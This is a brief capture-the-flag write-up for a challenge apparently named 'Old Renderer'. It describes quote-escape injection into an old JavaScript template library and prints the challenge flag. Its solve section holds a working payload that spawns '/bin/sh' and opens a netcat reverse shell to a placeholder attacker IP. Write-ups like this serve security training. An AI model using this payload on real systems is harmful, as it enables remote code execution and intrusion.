WU Old Renderer
Description
An old website using an old library developed by an old developer, what could go wrong ?

Author : Worty

Solve
As we control the template, we can put some breakpoint inside the library, and we can see that the parser.js variable can be injected by escaping the quote after the name of the file :

rename_value=");x=Object;w=a=x.constructor.call``;w.type="pipe";w.readable=1;w.writable=1;a.file="/bin/sh";a.args=["/bin/sh","-c","nc <YOUR_IP> 4444 -e /bin/sh"];a.stdio=[w,w];ff=Function`process.binding\x28\x22spawn_sync\x22\x29.spawn\x28a\x29.output`;ff.call``;//


Flag
MCTF{rc3_1s_4lw4ys_th3r3_wh3n_y0u_c0ntr0l_th3_t3mpl4t3_!!}
